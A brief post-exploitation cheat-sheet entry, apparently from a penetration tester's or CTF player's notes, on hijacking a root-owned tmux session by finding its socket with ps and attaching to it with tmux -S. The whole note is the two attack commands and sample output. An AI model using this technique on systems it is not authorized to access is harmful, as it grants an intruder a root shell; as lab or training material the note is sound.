---
tags: [PostEx]
title: PostEx/Hijacking TMUX sessions
created: '2020-02-04T05:01:09.171Z'
modified: '2020-02-04T05:02:36.407Z'
---

# PostEx/Hijacking TMUX sessions
Identify the session
```
ps -aux | grep root
...
/usr/bin/tmux -S /.devs/dev_sess
...
```
Hijack
```
tmux -S /.devs/dev_sess
```
